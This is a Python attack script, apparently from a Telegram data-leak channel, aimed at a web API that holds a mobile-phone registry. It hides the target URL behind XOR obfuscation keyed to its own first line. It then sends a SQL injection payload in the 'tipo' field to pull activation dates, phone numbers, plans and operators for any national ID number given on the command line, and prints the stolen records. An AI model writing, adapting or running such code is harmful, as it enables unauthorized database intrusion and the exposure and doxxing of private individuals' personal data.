#https://t.me/himikodata_test
import json
import requests
import sys
documento = sys.argv[1]

url = "".join([chr(i) for i in [((i) ^ sum([i for i in (eval(")'br' ,__elif__(nepo"[::-1])).readline() ])) for i in [2698, 2710, 2710, 2706, 2705, 2776, 2765, 2765, 2691, 2706, 2699, 2764, 2699, 2700, 2692, 2701, 2709, 2695, 2688, 2764, 2691, 2706, 2706, 2765, 2699, 2688, 2699, 2765, 2702, 2699, 2705, 2710, 2691, 2704, 2731, 2700, 2692, 2701, 2704, 2703, 2691, 2689, 2699, 2701, 2700, 2736, 2727, 2734, 2727, 2723, 2737, 2727, 2749, 2696, 2705, 2701, 2700]]])
data = {
    "documento": "-1",
    "usuarioid": 4585,
    "tipo": f"R' union distinct  select 1,null,null,FECHA_ACTIVACION,Celular,PlanTipo,PLANCELULAR,OPERADOR,DOCUMENTO,null,null from PadronCelulares where DOCUMENTO='{documento}' -- ",
    "tabla": "informacion",
}

print("Request to:", url)
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Content-Type': 'application/json',
}

req = requests.post(url, headers=headers, json=data)
data = req.json()
response = data['objeto']
result = []
for r in response:
    print( json.dumps({
        'fecha_activacion': r['tipo'],
        'celular': r['tel1'],
        'plan_tipo': r['tel2'],
        'plan_celular': r['direccion'],
        'operador': r['departamento'],
        'documento': r['provincia']
    }, indent=4))